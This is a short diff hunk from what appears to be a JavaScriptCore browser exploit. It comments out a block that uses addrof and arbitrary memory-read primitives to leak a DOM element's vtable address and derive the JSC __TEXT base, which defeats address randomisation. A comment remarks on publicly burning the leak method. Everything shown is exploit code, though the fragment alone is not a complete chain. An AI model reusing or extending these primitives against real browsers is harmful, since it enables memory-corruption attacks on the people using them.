@@ -978,7 +978,7 @@ function foo(obj) {
         log('[+] divelement vtable seems to be at '+v_tlb.toString(16));
         var anchor = memory.read_i64(v_tlb,0);
         
-        var bb = {};
+        /*var bb = {};
         bb[0] = 1.1
         var bbaddr = stage2.addrof(bb);
         //about to burn a vtable leak method publically RIP
@@ -997,7 +997,7 @@ function foo(obj) {
 	var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
 	log("JSC __TEXT header @" + header);
     log("v_tlb vs vtable" + vtable + v_tlb);
-    log("anchor vs jscbase" + anchor + jscbase);
+    log("anchor vs jscbase" + anchor + jscbase);*/
         
         
         
